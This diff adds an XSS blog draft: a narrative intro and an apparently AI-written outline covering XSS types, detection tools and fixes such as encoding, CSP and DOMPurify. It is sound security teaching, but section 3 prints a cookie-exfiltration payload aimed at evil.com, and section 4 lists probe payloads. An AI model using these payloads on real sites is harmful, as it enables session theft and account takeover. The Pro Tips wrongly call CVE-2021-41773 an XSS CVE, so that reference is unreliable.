@@ -1,0 +1,131 @@
+================================================================================
+ARTICLE INTRO — "XSS: Detection and Fixing"
+================================================================================
+
+It was 2015 when I first watched, in real time, a session cookie get swiped
+from a client's web app during a penetration test. One crafted URL. One
+unsuspecting click. Game over — full account takeover in under three seconds.
+The vulnerability? A classic Cross-Site Scripting flaw that had been sitting
+in production for two years, completely invisible to the dev team.
+
+That incident stuck with me. Not because it was exotic — XSS is anything but
+exotic. It's been on the OWASP Top 10 list for over a decade. It's been used
+to compromise platforms like Twitter, Facebook, and eBay. It powered the
+infamous Samy worm that infected over a million MySpace profiles in under 24
+hours. And yet, to this day, it remains one of the most commonly found
+vulnerabilities in modern web applications.
+
+Why? Because it hides in plain sight. Inside a search box. Inside a comment
+field. Inside a URL parameter that a developer "sanitized" with a regex they
+found on Stack Overflow in 2012.
+
+In this article, I'll break down exactly how XSS works, how attackers exploit
+it, how to systematically detect it in your own applications — both manually
+and with tools — and most importantly, how to fix it properly so it stays
+fixed. Whether you're a developer who wants to write safer code or a security
+tester sharpening your methodology, this guide is for you.
+
+Let's get into it.
+
+================================================================================
+ARTICLE STRUCTURE OVERVIEW
+================================================================================
+
+● Good article topic. Here structure:                                                                                                                                                                                                  
+                                                                                                                                                                                                                                     
+  ---                                                                                                                                                                                                                                  
+  Article Structure: "XSS: Detection and Fixing"
+                                                                                                                                                                                                                                       
+  1. Hook / Intro (150-200 words)
+
+  - Real-world breach example (e.g., British Airways, Magecart attacks)
+  - "What if attacker runs JS in your user's browser?"
+  - State what article covers
+
+  ---
+  2. What is XSS? (300 words)
+
+  - Definition: injecting malicious scripts into trusted pages
+  - How browser trusts injected code
+  - 3 types — dedicate subsection each:
+    - Stored XSS — persisted in DB, hits all users
+    - Reflected XSS — URL-based, one-shot
+    - DOM-based XSS — client-side JS manipulates DOM
+
+  ---
+  3. How XSS Gets Exploited (200 words)
+
+  - Cookie/session theft
+  - Keylogging
+  - Phishing via DOM manipulation
+  - Redirect to malicious site
+  - Include 1-2 minimal payload examples:
+  <script>document.location='http://evil.com?c='+document.cookie</script>
+
+  ---
+  4. Detection (400 words) ← core section
+
+  Split into two angles:
+
+  Manual Testing
+  - Test input fields, URL params, headers
+  - Common payloads to probe: <script>alert(1)</script>, "><img src=x onerror=alert(1)>
+  - Check reflected output in page source
+
+  Automated Tools
+
+  ┌─────────────────┬─────────┬──────────────────────────┐
+  │      Tool       │  Type   │         Best For         │
+  ├─────────────────┼─────────┼──────────────────────────┤
+  │ Burp Suite      │ DAST    │ Manual-assisted scanning │
+  ├─────────────────┼─────────┼──────────────────────────┤
+  │ OWASP ZAP       │ DAST    │ Free, CI integration     │
+  ├─────────────────┼─────────┼──────────────────────────┤
+  │ Semgrep         │ SAST    │ Code-level detection     │
+  ├─────────────────┼─────────┼──────────────────────────┤
+  │ DOMPurify audit │ Library │ DOM XSS review           │
+  └─────────────────┴─────────┴──────────────────────────┘
+
+  Code Review Signals
+  - innerHTML, document.write, eval() with user input
+  - Unescaped template variables
+
+  ---
+  5. Fixing / Prevention (400 words) ← core section
+
+  - Output encoding — escape <, >, ", ', & by context (HTML/JS/URL)
+  - CSP headers — Content-Security-Policy: script-src 'self'
+  - Sanitize input — use DOMPurify, not regex
+  - HttpOnly cookies — block JS cookie access
+  - Framework defaults — React/Vue auto-escape, show how to break it accidentally (dangerouslySetInnerHTML)
+
+  Code example pair (vulnerable vs fixed):
+  // Vulnerable
+  element.innerHTML = userInput;
+
+  // Fixed
+  element.textContent = userInput;
+  // or
+  element.innerHTML = DOMPurify.sanitize(userInput);
+
+  ---
+  6. Quick Reference Checklist (table/list)
+
+  - Readers bookmark this — high SEO value
+  - "Before you ship" XSS checklist
+
+  ---
+  7. Conclusion (100 words)
+
+  - XSS = trust problem between server and browser
+  - Defense-in-depth: encode + sanitize + CSP + HttpOnly
+  - CTA: link to OWASP XSS cheat sheet
+
+  ---
+  Pro Tips for Good Blog Quality
+
+  - Add screenshots of Burp Suite finding XSS — visual proof builds trust
+  - Target audience — decide: developer fixing code, or security tester? Tone differs
+  - Real CVE reference — cite one real XSS CVE (e.g., CVE-2021-41773)
+  - Length — 1500-2500 words hits SEO sweet spot
+  - SEO title tweak — "XSS Explained: How to Detect and Fix Cross-Site Scripting in 2024"
